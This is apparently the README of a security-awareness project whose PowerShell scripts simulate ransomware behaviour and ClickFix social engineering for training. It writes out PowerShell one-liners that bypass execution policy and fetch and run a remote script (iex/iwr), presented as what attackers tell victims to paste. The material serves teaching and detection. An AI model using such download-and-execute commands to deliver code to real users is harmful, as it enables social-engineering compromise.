# Simalicious - Cybersecurity Training Scripts

PowerShell scripts that simulate malicious activity for cybersecurity awareness training. These scripts demonstrate common attack patterns without causing actual harm.

## ⚠️ IMPORTANT DISCLAIMER

**THESE SCRIPTS ARE FOR EDUCATIONAL AND TRAINING PURPOSES ONLY**

- No files are actually encrypted or harmed
- No real malicious activity occurs
- All actions are simulated for learning
- Do not use these scripts for illegal purposes
- Always run in controlled training environments

## 🎯 Training Scenarios

### Phishing & ClickFix Attacks
These scripts simulate the PowerShell-based attacks commonly delivered through:
- Phishing emails with malicious attachments
- "ClickFix" social engineering (fake error messages)
- Malicious websites instructing users to run PowerShell commands
- Tech support scams

## 📁 Files Included

### `simalicious.ps1` - Main Simulation Script
The comprehensive malware simulation that demonstrates:
- System reconnaissance and information gathering
- File discovery and targeting
- Fake encryption process with progress indicators
- Ransomware note creation
- Persistence mechanism simulation
- Command & Control (C2) communication simulation
- Anti-analysis techniques

**Usage:**
```powershell
# Basic execution
.\simalicious.ps1

# Verbose mode (shows detailed operations)
.\simalicious.ps1 -Verbose

# Quick mode (faster execution for demos)
.\simalicious.ps1 -QuickMode


# Usage examples that attackers might instruct victims to run:

# Windows - Via Run Dialog (Win+R):
powershell -ep bypass -c "iex (iwr 'https://raw.githubusercontent.com/ifrantic/simalicious/refs/heads/main/simalicious.ps1').Content"

# Cross-platform - Via Terminal/Command Prompt (requires PowerShell):
powershell -ExecutionPolicy Bypass -Command "Invoke-Expression (Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/ifrantic/simalicious/refs/heads/main/simalicious.ps1' -UseBasicParsing).Content"

```
## 🚨 Common Attack Patterns Demonstrated

### 1. Windows ClickFix Pattern
Attackers often instruct Windows victims to:
1. Press `Windows + R` to open Run dialog
2. Paste a malicious PowerShell command
3. Press Enter to execute

### 2. Linux/macOS ClickFix Pattern
Attackers often instruct Linux/macOS victims to:
1. Press `Ctrl + Alt + T` (Linux) or `Cmd + Space` then type "Terminal" (macOS)
2. Paste a malicious PowerShell command
3. Press Enter to execute

### 3. Cross-Platform Social Engineering
- **Fake error messages** claiming system compromise
- **Urgent instructions** to "fix" the problem immediately
- **Technical-sounding commands** that victims don't understand
- **Authority impersonation** (IT support, Microsoft, etc.)


## 🛡️ Training Value

This simulation helps learners understand:

### Attack Techniques
- How malware gathers system information
- File discovery and targeting methods
- Encryption simulation and ransom demands
- Persistence and stealth techniques
- Command and control communication

### Social Engineering
- ClickFix attack methodology
- PowerShell-based delivery mechanisms
- Urgency and fear tactics in ransom notes
- Technical instruction obfuscation

### Detection Opportunities
- Suspicious PowerShell execution patterns
- Network communication indicators
- File system changes and artifacts
- Registry and persistence modifications

## 🔧 Training Environment Setup

### Prerequisites
**Windows:**
- Windows system with PowerShell 5.0+
- Ability to run PowerShell scripts
- Controlled/isolated training environment

**Linux:**
- PowerShell Core installed (`sudo apt install powershell` or equivalent)
- Terminal access
- Controlled/isolated training environment

**macOS:**
- PowerShell Core installed (`brew install powershell`)
- Terminal access
- Controlled/isolated training environment


## 🧹 Cleanup

The simulation creates temporary files for realism:

### Automatic Cleanup Locations
**Windows:**
- Temp directory: `%TEMP%\simalicious_training\`
- Desktop ransom note: `Desktop\README_SIMALICIOUS_TRAINING.txt`
- Additional temp files in `%TEMP%`

**Linux/macOS:**
- Temp directory: `/tmp/simalicious_training/`
- Desktop ransom note: `~/Desktop/README_SIMALICIOUS_TRAINING.txt`
- Additional temp files in `/tmp/`

### Manual Cleanup
**Windows:**
```powershell
# Remove simulation artifacts
Remove-Item "$env:TEMP\simalicious_training" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item "$env:USERPROFILE\Desktop\README_SIMALICIOUS_TRAINING.txt" -Force -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\YOUR_FILES_ARE_ENCRYPTED.txt" -Force -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\TRAINING_RANSOM_NOTE.txt" -Force -ErrorAction SilentlyContinue
```

**Linux/macOS:**
```bash
# Remove simulation artifacts
rm -rf /tmp/simalicious_training
rm -f ~/Desktop/README_SIMALICIOUS_TRAINING.txt
rm -f /tmp/YOUR_FILES_ARE_ENCRYPTED.txt
rm -f /tmp/TRAINING_RANSOM_NOTE.txt
```

---

**Remember**: The best defense against these attacks is user education and technical controls working together!
